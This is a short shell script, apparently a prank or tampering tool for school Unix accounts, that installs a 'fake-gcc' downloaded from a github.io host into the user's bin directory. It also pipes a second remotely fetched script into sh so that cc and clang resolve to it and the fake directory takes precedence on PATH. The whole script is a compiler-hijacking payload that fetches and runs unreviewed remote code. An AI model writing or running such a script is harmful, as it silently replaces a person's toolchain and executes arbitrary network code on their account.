#!/bin/sh

if [ -n "$AFS_DIR" ]; then
    dir="$AFS_DIR/bin"
else
    dir="$HOME/.local/bin"
fi

mkdir -p "$dir"
file="$dir/gcc"
curl "https://d-002.github.io/epita/confloose/fake-gcc/gcc" >> "$file"

sed -i "s,GCC_PATH,$(which gcc),g" "$file"
chmod +x $file

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "fake-gcc" "'alias cc=gcc; alias clang=gcc; export PATH=\"$dir:\$PATH\"'" | sh
